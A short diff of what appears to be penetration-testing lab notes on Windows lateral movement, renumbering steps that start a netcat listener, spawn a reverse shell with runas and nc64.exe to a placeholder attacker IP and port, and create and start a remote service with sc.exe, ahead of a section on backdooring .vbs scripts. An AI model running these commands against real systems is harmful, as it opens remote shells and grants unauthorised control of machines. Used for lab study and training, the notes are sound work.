@@ -1297,9 +1297,9 @@ schtasks /S TARGET /TN "<task_name>" /DELETE /F
 4. `nc -lvp <listening_port>`
 
 From the new shell on the listener
-5. `runas /netonly /user:<domain>\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe <attacker_ip> <attacker_port>"`
-6. `sc.exe \\<target_ip_or_hostname> create <service_name> binPath= "<path_to_executable>" start= auto`
-7. `sc.exe \\<target_ip_or_hostname> start <service_name>`
+1. `runas /netonly /user:<domain>\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe <attacker_ip> <attacker_port>"`
+2. `sc.exe \\<target_ip_or_hostname> create <service_name> binPath= "<path_to_executable>" start= auto`
+3. `sc.exe \\<target_ip_or_hostname> start <service_name>`
 
 
 ### Backdooring .vbs Scripts
